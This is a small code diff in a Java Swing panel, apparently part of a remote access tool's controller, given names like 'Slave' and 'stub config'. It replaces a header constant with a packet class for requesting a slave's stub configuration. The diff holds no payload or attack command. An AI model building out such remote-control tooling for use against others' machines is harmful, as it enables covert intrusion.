@@ -17,7 +17,7 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
+import com.redpois0n.packets.outgoing.Packet88StubConfig;
 
 @SuppressWarnings("serial")
 public class PanelControlConfig extends PanelControlParent {
@@ -57,7 +57,7 @@ public class PanelControlConfig extends PanelControlParent {
 		btnReload.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				clear();
-				slave.addToSendQueue(OutgoingHeader.GET_STUB_CONFIG);
+				slave.addToSendQueue(new Packet88StubConfig());
 			}
 		});
 		
